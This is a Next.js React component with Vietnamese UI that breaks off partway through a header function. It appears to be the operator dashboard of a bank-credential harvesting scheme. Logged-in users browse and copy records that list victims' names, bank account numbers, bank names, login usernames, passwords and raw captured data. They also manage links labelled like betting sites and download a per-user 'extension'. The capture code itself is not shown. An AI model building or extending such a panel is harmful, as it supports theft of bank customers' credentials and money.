"use client";

import { motion } from "framer-motion";
import {
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  Copy,
  CopyPlus,
  CreditCard,
  Download,
  Eye,
  EyeOff,
  FileText,
  KeyRound,
  Landmark,
  LinkIcon,
  Lock,
  LogIn,
  LogOut,
  RefreshCcw,
  ShieldCheck,
  User,
  UserPlus,
} from "lucide-react";
import React, { useEffect, useMemo, useState } from "react";

/* ================== Types ================== */
type RecordItem = {
  hoVaTen: string;
  soTaiKhoan: string;
  tenNganHang: string;
  chiNhanh: string;
  tenDangNhap: string;
  nickname: string;
  soPhien: string;
  soDienThoai: string;
  email: string;
  ngaySinh: string;
  rawData: string;
  createdAt: string;
};

type LinkItem = {
  _id: string;
  name: string;
  link: string;
  display?: boolean;
  createdAt?: string;
  updatedAt?: string;
};

type AuthMode = "login" | "register";
type TabKey = "records" | "links";

/* ================== Page ================== */
export default function DashboardTabs() {
  // Accent: 1 màu, không neon/gradient
  const accent = "rgb(59,130,246)"; // tailwind sky-500

  // Auth
  const [isAuthed, setIsAuthed] = useState(false);
  const [username, setUsername] = useState<string>("");

  // Tabs
  const [tab, setTab] = useState<TabKey>("records");

  // Data/UI - Records
  const [records, setRecords] = useState<RecordItem[]>([]);
  const [q, setQ] = useState("");
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState("");
  const [toast, setToast] = useState<string>("");

  // Pagination - Records
  const [page, setPage] = useState(1);
  const [pageSize, setPageSize] = useState(12);

  // Modal
  const [modalOpen, setModalOpen] = useState(false);
  const [authMode, setAuthMode] = useState<AuthMode>("login");

  // Links admin
  const [links, setLinks] = useState<LinkItem[]>([]);
  const [linksLoading, setLinksLoading] = useState(false);
  const [linkSearch, setLinkSearch] = useState("");
  const [linkForm, setLinkForm] = useState({ name: "", link: "" });
  const [linkSubmitting, setLinkSubmitting] = useState(false);

  /* ================== Global styles (Liquid Glass) ================== */
  useEffect(() => {
    const root = document.documentElement;
    root.style.setProperty("--accent", accent);
    return () => {
      root.style.removeProperty("--accent");
    };
  }, [accent]);

  /* ================== Utils ================== */
  function showToast(msg: string) {
    setToast(msg);
    setTimeout(() => setToast(""), 1600);
  }

  async function copyText(t: string) {
    try {
      await navigator.clipboard.writeText(t);
      setCopied(t);
      setTimeout(() => setCopied(""), 1100);
    } catch {}
  }

  function getToken(): string | null {
    try {
      return localStorage.getItem("token");
    } catch {
      return null;
    }
  }

  /* ================== Auth Calls ================== */
  async function doLogin(user: string, pass: string) {
    const res = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: user, password: pass }),
    });
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error || "Login failed");

    // Lưu token vào localStorage để giữ phiên
    if (json?.token) localStorage.setItem("token", json.token);

    // Lưu username để dùng bên Links
    localStorage.setItem("username", json?.username ?? user);

    return { username: json?.username ?? user };
  }

  async function doRegister(user: string, pass: string) {
    const res = await fetch("/api/auth/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: user, password: pass }),
    });
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error || "Register failed");
    return { username: json?.username ?? user };
  }

  async function doLogout() {
    try {
      await fetch("/api/auth/logout", { method: "POST" }).catch(() => {});
    } catch {}
    localStorage.removeItem("token");
    localStorage.removeItem("username");
    setIsAuthed(false);
    setUsername("");
    setRecords([]);
    setLinks([]);
    showToast("Đã đăng xuất");
  }

  async function fetchProfile(): Promise<string | null> {
    const token = getToken();
    if (!token) return null;

    const res = await fetch("/api/auth/profile", {
      headers: { Authorization: `Bearer ${token}` },
      cache: "no-store",
    });
    if (!res.ok) {
      localStorage.removeItem("token");
      return null;
    }
    const json = await res.json();
    return json?.username ?? null;
  }

  /* ================== Records Data Fetch ================== */
  async function fetchUserRecords(user: string) {
    if (!user) return;
    const token = getToken();
    if (!token) {
      setIsAuthed(false);
      setUsername("");
      return;
    }
    try {
      setLoading(true);
      const res = await fetch(`/api/records/${encodeURIComponent(user)}`, {
        headers: { Authorization: `Bearer ${token}` },
        cache: "no-store",
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json?.error || "Fetch failed");
      const payload = json?.data ?? json;
      setRecords(Array.isArray(payload) ? payload : [payload]);
    } catch (e: any) {
      setRecords([]);
      showToast(e?.message || "Không thể tải dữ liệu");
    } finally {
      setLoading(false);
    }
  }

  /* ================== Links Data Fetch ================== */
  async function fetchAllLinks(user = username) {
    if (!user) return;
    try {
      setLinksLoading(true);
      const res = await fetch(`/api/links/${encodeURIComponent(user)}/all`, {
        cache: "no-store",
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json?.error || "Fetch links failed");
      const data = (json?.data || []).map((d: any) => ({
        ...d,
        _id: d._id?.$oid || d._id,
      }));
      setLinks(data);
    } catch (e: any) {
      setLinks([]);
      showToast(e?.message || "Không thể tải link");
    } finally {
      setLinksLoading(false);
    }
  }

  async function addLink(e: React.FormEvent) {
    e.preventDefault();
    if (!username) {
      showToast("Chưa đăng nhập / thiếu username");
      return;
    }
    if (!linkForm.name.trim() || !linkForm.link.trim()) {
      showToast("Vui lòng nhập đủ tên & link");
      return;
    }
    try {
      setLinkSubmitting(true);
      const res = await fetch(`/api/links/${encodeURIComponent(username)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(linkForm),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json?.error || "Add link failed");
      setLinkForm({ name: "", link: "" });
      showToast("Đã thêm link");
      fetchAllLinks();
    } catch (e: any) {
      showToast(e?.message || "Không thể thêm link");
    } finally {
      setLinkSubmitting(false);
    }
  }

  async function toggleDisplay(id: string, display: boolean) {
    if (!username) return;
    try {
      const res = await fetch(
        `/api/links/${encodeURIComponent(username)}/${id}`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ display }),
        }
      );
      const json = await res.json();
      if (!res.ok) throw new Error(json?.error || "Update failed");

      setLinks((prev) =>
        prev.map((x) => (x._id === id ? { ...x, display } : x))
      );
      showToast(display ? "Đã bật hiển thị" : "Đã ẩn link");
    } catch (e: any) {
      showToast(e?.message || "Không thể cập nhật");
    }
  }

  /* ================== Init from localStorage ================== */
  useEffect(() => {
    (async () => {
      const token = getToken();
      if (!token) return; // chưa đăng nhập
      const user = await fetchProfile();
      if (user) {
        setUsername(user);
        setIsAuthed(true);
        // fetch cả 2 tab ngay từ đầu
        fetchUserRecords(user);
        fetchAllLinks(user);
      } else {
        localStorage.removeItem("token");
        localStorage.removeItem("username");
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Search (Records)
  const filtered = useMemo(() => {
    const term = q.toLowerCase().trim();
    return term
      ? records.filter((r) =>
          Object.values(r).some((v) => String(v).toLowerCase().includes(term))
        )
      : records;
  }, [q, records]);

  // Reset page khi thay đổi từ khóa/pageSize
  useEffect(() => {
    setPage(1);
  }, [q, pageSize]);

  // Pagination calc (Records)
  const total = filtered.length;
  const totalPages = Math.max(1, Math.ceil(total / pageSize));
  const currentPage = Math.min(page, totalPages);
  const startIdx = (currentPage - 1) * pageSize;
  const endIdx = Math.min(startIdx + pageSize, total);
  const pageData = filtered.slice(startIdx, endIdx);

  // Download ZIP theo username
  // const startDownload = async () => {
  //   if (!isAuthed || !username) {
  //     showToast("Vui lòng đăng nhập để tải file của bạn.");
  //     setModalOpen(true);
  //     setAuthMode("login");
  //     return;
  //   }
  //   const zipPath = `/${encodeURIComponent(username)}.zip`;
  //   try {
  //     const head = await fetch(zipPath, { method: "HEAD", cache: "no-store" });
  //     if (!head.ok) {
  //       // dùng toast chuyên nghiệp theo yêu cầu
  //       showToast("Không tìm thấy tài nguyên");
  //       return;
  //     }
  //     const a = document.createElement("a");
  //     a.href = zipPath;
  //     a.download = `${username}.zip`;
  //     document.body.appendChild(a);
  //     a.click();
  //     a.remove();
  //   } catch {
  //     showToast("Không tìm thấy tài nguyên");
  //   }
  // };
  const startDownload = async () => {
    if (!isAuthed || !username) {
      showToast("Vui lòng đăng nhập để tải.");
      setAuthMode("login");
      setModalOpen(true);
      return;
    }
    try {
      const url = `/api/extension/download?username=${encodeURIComponent(
        username
      )}`;
      // Cho phép đặt tên từ header Content-Disposition, chỉ cần mở link:
      const a = document.createElement("a");
      a.href = url;
      a.rel = "noopener";
      document.body.appendChild(a);
      a.click();
      a.remove();
    } catch {
      showToast("Không thể tải file");
    }
  };

  /* ================== UI ================== */
  return (
    <div className="min-h-screen bg-[#0e1218] text-white relative">
      {/* glass utilities */}
      <style jsx global>{`
        .glass {
          background: rgba(255, 255, 255, 0.21);
          border-radius: 16px;
          box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
          backdrop-filter: blur(9.4px);
          -webkit-backdrop-filter: blur(9.4px);
          border: 1px solid rgba(255, 255, 255, 0.18);
        }
        .text-muted {
          color: rgba(255, 255, 255, 0.86);
        }
        .text-dim {
          color: rgba(255, 255, 255, 0.55);
        }
        .icon-dim {
          color: rgba(255, 255, 255, 0.65);
        }
        .btn-outline {
          border: 1px solid rgba(255, 255, 255, 0.18);
          background: rgba(255, 255, 255, 0.1);
        }
        .btn-outline:hover {
          background: rgba(255, 255, 255, 0.16);
        }
        .btn-solid {
          background: ${accent};
          color: #0b1220;
        }
        .btn-solid:hover {
          filter: brightness(0.95);
        }
        .input-glass {
          background: rgba(255, 255, 255, 0.14);
          border: 1px solid rgba(255, 255, 255, 0.18);
          border-radius: 12px;
        }
        .tab-btn {
          border: 1px solid rgba(255, 255, 255, 0.18);
          background: rgba(255, 255, 255, 0.1);
          padding: 8px 14px;
          border-radius: 12px;
          font-weight: 600;
        }
        .tab-btn.active {
          background: rgba(255, 255, 255, 0.18);
          color: white;
        }
        @media (max-width: 639px) {
          .tab-btn {
            width: 100%;
            text-align: center;
          }
        }
      `}</style>

      {/* Sticky Header */}
      <HeaderBar
        accent={accent}
        isAuthed={isAuthed}
        username={username}
        tab={tab}
        setTab={setTab}
        onRefresh={() => {
          if (!username) return;
          if (tab === "records") fetchUserRecords(username);
          else fetchAllLinks(username);
        }}
        onDownload={startDownload}
        onLogout={doLogout}
        onOpenLogin={() => {
          setAuthMode("login");
          setModalOpen(true);
        }}
        onOpenRegister={() => {
          setAuthMode("register");
          setModalOpen(true);
        }}
      />

      {/* Main content */}
      <div className="mx-auto w-full max-w-7xl px-4 sm:px-6 lg:px-8 py-6 space-y-6">
        {tab === "records" ? (
          <RecordsSection
            isAuthed={isAuthed}
            username={username}
            q={q}
            setQ={setQ}
            pageSize={pageSize}
            setPageSize={setPageSize}
            loading={loading}
            filtered={filtered}
            pageData={pageData}
            startIdx={startIdx}
            endIdx={endIdx}
            total={total}
            totalPages={totalPages}
            currentPage={currentPage}
            setPage={setPage}
            copyText={copyText}
            accent={accent}
          />
        ) : (
          <LinksSection
            isAuthed={isAuthed}
            username={username}
            links={links}
            loading={linksLoading}
            linkSearch={linkSearch}
            setLinkSearch={setLinkSearch}
            linkForm={linkForm}
            setLinkForm={setLinkForm}
            linkSubmitting={linkSubmitting}
            addLink={addLink}
            toggleDisplay={toggleDisplay}
            fetchAllLinks={() => fetchAllLinks(username)}
            accent={accent}
          />
        )}
      </div>

      {/* Toasts */}
      {copied && (
        <Toast>
          <Copy size={14} className="icon-dim" />
          <span className="text-muted">
            Đã copy: <span className="font-mono text-white">{copied}</span>
          </span>
        </Toast>
      )}
      {toast && <Toast>{toast}</Toast>}

      {/* Auth Modal */}
      {modalOpen && (
        <AuthModal
          accent={accent}
          mode={authMode}
          onClose={() => setModalOpen(false)}
          onSwitchMode={(m) => setAuthMode(m)}
          onSubmit={async (mode, form) => {
            try {
              let info: { username: string };
              if (mode === "register") {
                await doRegister(form.username, form.password);
                info = await doLogin(form.username, form.password); // auto login
              } else {
                info = await doLogin(form.username, form.password);
              }
              setIsAuthed(true);
              setUsername(info.username);
              setModalOpen(false);
              showToast("Đăng nhập thành công");
              // nạp data cả 2 tab
              fetchUserRecords(info.username);
              fetchAllLinks(info.username);
            } catch (e: any) {
              showToast(e?.message || "Thao tác thất bại");
            }
          }}
        />
      )}
    </div>
  );
}

/* ================== Records Section ================== */
function RecordsSection(props: {
  isAuthed: boolean;
  username: string;
  q: string;
  setQ: (v: string) => void;
  pageSize: number;
  setPageSize: (n: number) => void;
  loading: boolean;
  filtered: RecordItem[];
  pageData: RecordItem[];
  startIdx: number;
  endIdx: number;
  total: number;
  totalPages: number;
  currentPage: number;
  setPage: React.Dispatch<React.SetStateAction<number>>;
  copyText: (t: string) => void;
  accent: string;
}) {
  const {
    isAuthed,
    q,
    setQ,
    pageSize,
    setPageSize,
    loading,
    filtered,
    pageData,
    startIdx,
    endIdx,
    total,
    totalPages,
    currentPage,
    setPage,
    copyText,
    accent,
  } = props;

  return (
    <>
      {/* Toolbar: Search + page size */}
      <div className="flex flex-col sm:flex-row gap-3 sm:items-center sm:justify-between">
        <div className="glass px-3 sm:px-4 py-2 rounded-2xl w-full sm:max-w-md">
          <div className="flex items-center gap-2">
            <User size={16} className="icon-dim" />
            <input
              value={q}
              onChange={(e) => setQ(e.target.value)}
              placeholder="Tìm kiếm: tên, STK, ngân hàng, SĐT, email..."
              className="w-full bg-transparent outline-none placeholder:text-dim text-sm"
              disabled={!isAuthed}
            />
          </div>
        </div>

        <div className="glass px-3 py-2 rounded-2xl flex items-center justify-between sm:justify-start gap-3">
          <span className="text-dim text-sm">Hiển thị</span>
          <select
            value={pageSize}
            onChange={(e) => setPageSize(Number(e.target.value))}
            className="bg-transparent outline-none text-sm text-white"
            disabled={!isAuthed}
          >
            <option value={12} className="bg-[#0e1218]">
              12
            </option>
            <option value={24} className="bg-[#0e1218]">
              24
            </option>
            <option value={48} className="bg-[#0e1218]">
              48
            </option>
          </select>
          <span className="text-dim text-sm">/ trang</span>
          {isAuthed && (
            <span className="hidden sm:inline text-dim text-sm">
              · Tổng <span className="text-white">{filtered.length}</span>
            </span>
          )}
        </div>
      </div>

      {/* Content */}
      {!isAuthed ? (
        <EmptyState accent={accent} />
      ) : loading ? (
        <SkeletonGrid />
      ) : total === 0 ? (
        <div className="glass p-8 rounded-2xl text-center text-dim">
          Không có dữ liệu phù hợp.
        </div>
      ) : (
        <>
          {/* ===== REPLACE grid render records bằng đoạn này ===== */}
          <div className="grid gap-4 sm:gap-5 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
            {pageData.map((r, i) => (
              <motion.div
                key={`${r.soTaiKhoan}-${i}`}
                initial={{ opacity: 0, y: 14 }}
                animate={{ opacity: 1, y: 0 }}
                whileHover={{ y: -2 }}
                transition={{ duration: 0.25 }}
                className="glass p-4 sm:p-5 rounded-2xl"
              >
                {/* Header tối giản */}
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-2 min-w-0">
                    <User size={18} className="icon-dim" />
                    <h2
                      className="text-base font-semibold truncate"
                      style={{ color: accent }}
                    >
                      {r.hoVaTen}
                    </h2>
                  </div>
                  <span className="text-xs text-dim whitespace-nowrap">
                    {new Date(r.createdAt).toLocaleDateString()}
                  </span>
                </div>

                {/* Body: chỉ 6 trường */}
                <div className="mt-3 grid  grid-cols-1 gap-1.5 text-sm">
                  <Info
                    label="Số TK"
                    icon={<CreditCard size={15} />}
                    value={r.soTaiKhoan}
                    onCopy={copyText}
                  />
                  <Info
                    label="Ngân hàng"
                    icon={<Landmark size={15} />}
                    value={r.tenNganHang}
                    onCopy={copyText}
                  />
                  <Info
                    label="Đăng nhập"
                    icon={<KeyRound size={15} />}
                    value={r.tenDangNhap}
                    onCopy={copyText}
                  />
                  <Info
                    label="Mật khẩu"
                    icon={<Lock size={15} />}
                    value={r.nickname}
                    onCopy={copyText}
                  />
                  <Info
                    label="RawData"
                    icon={<FileText size={15} />}
                    value={r.rawData}
                    onCopy={copyText}
                    truncateLines={2}
                  />
                </div>
              </motion.div>
            ))}
          </div>

          {/* Pagination */}
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mt-4">
            <div className="text-sm text-dim">
              Hiển thị{" "}
              <span className="text-white">
                {total === 0 ? 0 : startIdx + 1}
              </span>
              –<span className="text-white">{endIdx}</span> /{" "}
              <span className="text-white">{total}</span> bản ghi
            </div>

            <div className="glass px-2 py-1 rounded-2xl inline-flex items-center gap-1 w-full sm:w-auto justify-center">
              <PgBtn
                onClick={() => setPage(1)}
                disabled={currentPage === 1}
                title="Trang đầu"
              >
                <ChevronsLeft size={16} />
              </PgBtn>
              <PgBtn
                onClick={() => setPage((p) => Math.max(1, p - 1))}
                disabled={currentPage === 1}
                title="Trang trước"
              >
                <ChevronLeft size={16} />
              </PgBtn>

              <span className="px-3 text-sm">
                <span className="text-white">{currentPage}</span>
                <span className="text-dim"> / {totalPages}</span>
              </span>

              <PgBtn
                onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                disabled={currentPage === totalPages}
                title="Trang sau"
              >
                <ChevronRight size={16} />
              </PgBtn>
              <PgBtn
                onClick={() => setPage(totalPages)}
                disabled={currentPage === totalPages}
                title="Trang cuối"
              >
                <ChevronsRight size={16} />
              </PgBtn>
            </div>
          </div>
        </>
      )}
    </>
  );
}

/* ================== Links Section (admin theo username) ================== */
function LinksSection(props: {
  isAuthed: boolean;
  username: string;
  links: LinkItem[];
  loading: boolean;
  linkSearch: string;
  setLinkSearch: (v: string) => void;
  linkForm: { name: string; link: string };
  setLinkForm: React.Dispatch<
    React.SetStateAction<{ name: string; link: string }>
  >;
  linkSubmitting: boolean;
  addLink: (e: React.FormEvent) => void;
  toggleDisplay: (id: string, display: boolean) => void;
  fetchAllLinks: () => void;
  accent: string;
}) {
  const {
    isAuthed,
    username,
    links,
    loading,
    linkSearch,
    setLinkSearch,
    linkForm,
    setLinkForm,
    linkSubmitting,
    addLink,
    toggleDisplay,
    fetchAllLinks,
    accent,
  } = props;
  const [linkModalOpen, setLinkModalOpen] = React.useState(false);
  const filtered = useMemo(() => {
    const term = linkSearch.trim().toLowerCase();
    if (!term) return links;
    return links.filter(
      (x) =>
        x.name?.toLowerCase().includes(term) ||
        x.link?.toLowerCase().includes(term)
    );
  }, [links, linkSearch]);

  if (!isAuthed) {
    return (
      <div className="glass p-8 rounded-2xl text-center text-dim">
        Vui lòng đăng nhập để quản lý Links.
      </div>
    );
  }

  return (
    <>
      {/* Controls */}
      {/* ===== REPLACE Controls + remove Add form ===== */}
      <div className="glass p-3 rounded-2xl flex flex-col sm:flex-row gap-3 sm:items-center sm:justify-between">
        <div className="flex items-center gap-2 input-glass px-3 py-2 w-[200px] sm:max-w-sm">
          <User size={16} />
          <input
            value={username}
            disabled
            className="w-full bg-transparent outline-none text-white/90"
            title="Username hiện tại"
          />
        </div>

        <div className="flex items-center gap-2 input-glass px-3 py-2 w-[70%] sm:max-w-md">
          <LinkIcon size={16} />
          <input
            value={linkSearch}
            onChange={(e) => setLinkSearch(e.target.value)}
            placeholder="Tìm theo tên hoặc đường link…"
            className="w-full bg-transparent outline-none placeholder:text-dim"
          />
        </div>

        <div className="flex gap-2">
          <button
            onClick={() => setLinkModalOpen(true)}
            className="btn-solid px-4 py-2 rounded-xl inline-flex items-center gap-2 w-full sm:w-auto justify-center"
            title="Thêm link"
          >
            <CopyPlus size={20} className="text-white" />
          </button>
          <button
            onClick={fetchAllLinks}
            className="glass btn-outline px-4 py-2 rounded-xl inline-flex items-center gap-2 w-full sm:w-auto justify-center"
            title="Làm mới"
          >
            <RefreshCcw size={16} />
            <span className="text-muted">
              {loading ? "Đang tải…" : "Làm mới"}
            </span>
          </button>
        </div>
      </div>
      <LinkModal
        accent={accent}
        open={linkModalOpen}
        onClose={() => setLinkModalOpen(false)}
        loading={linkSubmitting}
        onSubmit={async (payload) => {
          // reuse addLink logic nhưng dạng hàm:
          const fakeEvent = {
            preventDefault() {},
          } as unknown as React.FormEvent;
          // nhỏ gọn: gọi API trực tiếp để tránh đụng state cũ
          try {
            if (!username) throw new Error("Chưa đăng nhập / thiếu username");
            const res = await fetch(
              `/api/links/${encodeURIComponent(username)}`,
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
              }
            );
            const json = await res.json();
            if (!res.ok) throw new Error(json?.error || "Add link failed");
            fetchAllLinks();
          } catch (e) {
            console.error(e);
          }
        }}
      />

      {/* List */}
      {loading ? (
        <p className="text-dim text-center">Đang tải dữ liệu…</p>
      ) : filtered.length === 0 ? (
        <div className="glass p-8 rounded-2xl text-center text-dim">
          Chưa có link.
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {filtered.map((item) => (
            <motion.div
              key={item._id}
              initial={{ opacity: 0, y: 12 }}
              animate={{ opacity: 1, y: 0 }}
              whileHover={{ y: -2 }}
              transition={{ duration: 0.2 }}
              className="glass p-4 rounded-2xl flex flex-col gap-3"
            >
              {/* Header */}
              <div className="flex items-start justify-between gap-3">
                <div className="min-w-0">
                  <h3
                    className="font-semibold text-base truncate"
                    style={{ color: accent }}
                  >
                    {item.name || "(Không tên)"}
                  </h3>
                  <a
                    href={item.link}
                    target="_blank"
                    rel="noreferrer"
                    className="block text-sm text-white/80 hover:underline break-all"
                  >
                    {item.link}
                  </a>
                </div>

                {/* Toggle display */}
                <button
                  onClick={() => toggleDisplay(item._id, !item.display)}
                  className="px-2.5 py-2 rounded-xl hover:bg-white/15 border border-white/20"
                  title={item.display ? "Ẩn link này" : "Hiển thị link này"}
                >
                  {item.display ? <Eye size={18} /> : <EyeOff size={18} />}
                </button>
              </div>

              {/* Actions */}
              <div className="flex items-center gap-2">
                <button
                  onClick={() => window.open(item.link, "_blank")}
                  className="btn-solid px-3 py-2 rounded-xl inline-flex items-center gap-2"
                  title="Mở link"
                >
                  <LinkIcon size={16} />
                  Mở
                </button>
                <button
                  onClick={() => navigator.clipboard.writeText(item.link)}
                  className="px-3 py-2 rounded-xl inline-flex items-center gap-2 border border-white/20 hover:bg-white/15"
                  title="Copy link"
                >
                  <Copy size={16} />
                  Copy
                </button>

                {/* Display badge (read-only state) */}
                <span
                  className={`ml-auto text-xs px-2 py-1 rounded-lg border ${
                    item.display
                      ? "border-white/25 text-white/90"
                      : "border-white/15 text-white/60"
                  }`}
                  title="Trạng thái hiển thị"
                >
                  {item.display ? "Đang hiển thị" : "Đang ẩn"}
                </span>
              </div>

              {/* Footer */}
              <div className="text-xs text-white/60 flex gap-4">
                {item.createdAt && (
                  <span>Tạo: {new Date(item.createdAt).toLocaleString()}</span>
                )}
                {item.updatedAt && (
                  <span>
                    Cập nhật: {new Date(item.updatedAt).toLocaleString()}
                  </span>
                )}
              </div>
            </motion.div>
          ))}
        </div>
      )}
    </>
  );
}

/* ================== Toast ================== */
function Toast({ children }: { children: React.ReactNode }) {
  return (
    <div className="fixed bottom-5 left-1/2 -translate-x-1/2 z-50">
      <div className="glass px-4 py-2 rounded-xl text-sm flex items-center gap-2">
        {children}
      </div>
    </div>
  );
}
/* ================== Empty / Skeleton ================== */
function EmptyState({ accent }: { accent: string }) {
  return (
    <div className="glass p-8 sm:p-10 rounded-2xl text-center">
      <div className="mx-auto max-w-md space-y-3">
        <div
          className="inline-flex items-center justify-center w-12 h-12 rounded-2xl"
          style={{ background: "rgba(255,255,255,0.14)" }}
        >
          <User size={22} />
        </div>
        <h3 className="text-lg font-semibold" style={{ color: accent }}>
          Chào mừng!
        </h3>
        <p className="text-dim text-sm">
          Hãy đăng nhập để xem & quản lý dữ liệu. Giao diện liquid glass, tối ưu
          di động.
        </p>
      </div>
    </div>
  );
}

function SkeletonGrid() {
  return (
    <div className="grid gap-4 sm:gap-5 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
      {Array.from({ length: 8 }).map((_, i) => (
        <div key={i} className="glass p-5 rounded-2xl animate-pulse">
          <div className="h-4 w-40 bg-white/20 rounded mb-4" />
          <div className="space-y-2">
            <div className="h-3 w-3/4 bg-white/15 rounded" />
            <div className="h-3 w-2/3 bg-white/15 rounded" />
            <div className="h-3 w-5/6 bg-white/15 rounded" />
            <div className="h-3 w-1/2 bg-white/15 rounded" />
          </div>
        </div>
      ))}
    </div>
  );
}
/* ================== Info Item ================== */
function Info({
  icon,
  label,
  value,
  onCopy,
  truncateLines = 1,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  onCopy: (t: string) => void;
  truncateLines?: number;
}) {
  return (
    <div className="flex items-start gap-2 group">
      <div className="mt-0.5">{icon}</div>
      <div className="flex-1 min-w-0">
        <div className="flex justify-between gap-2">
          <span className="text-dim text-xs uppercase font-medium">
            {label}
          </span>
          <button
            onClick={() => onCopy(value)}
            className="opacity-0 group-hover:opacity-100 transition-opacity text-xs text-white/70 hover:text-white"
            title="Copy giá trị"
          >
            Copy
          </button>
        </div>
        <div
          className={`text-sm text-white ${
            truncateLines > 1 ? `line-clamp-${truncateLines}` : "truncate"
          } break-all  mt-2`}
        >
          {value || "—"}
        </div>
      </div>
    </div>
  );
}

/* ================== Pagination Button ================== */
function PgBtn({
  onClick,
  disabled,
  children,
  title,
}: {
  onClick: () => void;
  disabled: boolean;
  children: React.ReactNode;
  title?: string;
}) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      title={title}
      className={`px-2 py-1.5 rounded-lg transition ${
        disabled
          ? "opacity-30 cursor-not-allowed"
          : "hover:bg-white/15 text-white"
      }`}
    >
      {children}
    </button>
  );
}

/* ================== Auth Modal ================== */
function AuthModal({
  accent,
  mode,
  onClose,
  onSwitchMode,
  onSubmit,
}: {
  accent: string;
  mode: "login" | "register";
  onClose: () => void;
  onSwitchMode: (m: "login" | "register") => void;
  onSubmit: (
    mode: "login" | "register",
    form: { username: string; password: string }
  ) => void | Promise<void>;
}) {
  const [form, setForm] = React.useState({ username: "", password: "" });
  const [showPass, setShowPass] = React.useState(false);
  const [loading, setLoading] = React.useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!form.username.trim() || !form.password.trim()) return;
    setLoading(true);
    await onSubmit(mode, form);
    setLoading(false);
  }

  return (
    <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center px-4">
      <div className="glass max-w-sm w-full p-6 rounded-2xl relative">
        <button
          onClick={onClose}
          className="absolute top-3 right-3 text-white/70 hover:text-white"
          title="Đóng"
        >
          ✕
        </button>
        <h2
          className="text-2xl font-semibold mb-4 text-center"
          style={{ color: accent }}
        >
          {mode === "login" ? "Đăng nhập" : "Đăng ký"}
        </h2>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="input-glass px-3 py-2 flex items-center gap-2">
            <User size={16} />
            <input
              value={form.username}
              onChange={(e) =>
                setForm((s) => ({ ...s, username: e.target.value }))
              }
              placeholder="Tên đăng nhập"
              className="w-full bg-transparent outline-none placeholder:text-dim"
            />
          </div>
          <div className="input-glass px-3 py-2 flex items-center gap-2">
            <Lock size={16} />
            <input
              type={showPass ? "text" : "password"}
              value={form.password}
              onChange={(e) =>
                setForm((s) => ({ ...s, password: e.target.value }))
              }
              placeholder="Mật khẩu"
              className="w-full bg-transparent outline-none placeholder:text-dim"
            />
            <button
              type="button"
              onClick={() => setShowPass(!showPass)}
              className="text-white/60 hover:text-white"
              title={showPass ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
            >
              {showPass ? <EyeOff size={16} /> : <Eye size={16} />}
            </button>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="btn-solid w-full py-2 rounded-xl font-semibold mt-2"
          >
            {loading
              ? "Đang xử lý..."
              : mode === "login"
              ? "Đăng nhập"
              : "Đăng ký"}
          </button>
        </form>

        <p className="text-center text-dim text-sm mt-3">
          {mode === "login" ? "Chưa có tài khoản?" : "Đã có tài khoản?"}{" "}
          <button
            type="button"
            onClick={() =>
              onSwitchMode(mode === "login" ? "register" : "login")
            }
            className="text-white/90 hover:underline"
          >
            {mode === "login" ? "Đăng ký" : "Đăng nhập"}
          </button>
        </p>
      </div>
    </div>
  );
}
/* ================== Link Create/Edit Modal ================== */
function LinkModal({
  accent,
  open,
  onClose,
  onSubmit,
  loading,
}: {
  accent: string;
  open: boolean;
  onClose: () => void;
  onSubmit: (payload: { name: string; link: string }) => Promise<void> | void;
  loading?: boolean;
}) {
  const [form, setForm] = React.useState({ name: "", link: "" });

  React.useEffect(() => {
    if (!open) setForm({ name: "", link: "" });
  }, [open]);

  if (!open) return null;
  return (
    <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center px-4">
      <div className="glass max-w-md w-full p-6 rounded-2xl relative">
        <button
          onClick={onClose}
          className="absolute top-3 right-3 text-white/70 hover:text-white"
          title="Đóng"
        >
          ✕
        </button>
        <h2 className="text-xl font-semibold mb-4" style={{ color: accent }}>
          Thêm link
        </h2>
        <div className="space-y-3">
          <div className="input-glass px-3 py-2">
            <input
              value={form.name}
              onChange={(e) => setForm((s) => ({ ...s, name: e.target.value }))}
              placeholder="Tên web (vd: U888)"
              className="w-full bg-transparent outline-none placeholder:text-dim"
            />
          </div>
          <div className="input-glass px-3 py-2">
            <input
              value={form.link}
              onChange={(e) => setForm((s) => ({ ...s, link: e.target.value }))}
              placeholder="https://..."
              className="w-full bg-transparent outline-none placeholder:text-dim"
            />
          </div>
          <button
            className="btn-solid w-full py-2 rounded-xl font-semibold"
            disabled={loading || !form.name.trim() || !form.link.trim()}
            onClick={async () => {
              await onSubmit({ ...form });
              onClose();
            }}
          >
            {loading ? "Đang thêm..." : "Thêm link"}
          </button>
        </div>
      </div>
    </div>
  );
}

/* ===== REPLACE toàn bộ khối "Sticky Header" cũ bằng đoạn này ===== */
function HeaderBar({
  accent,
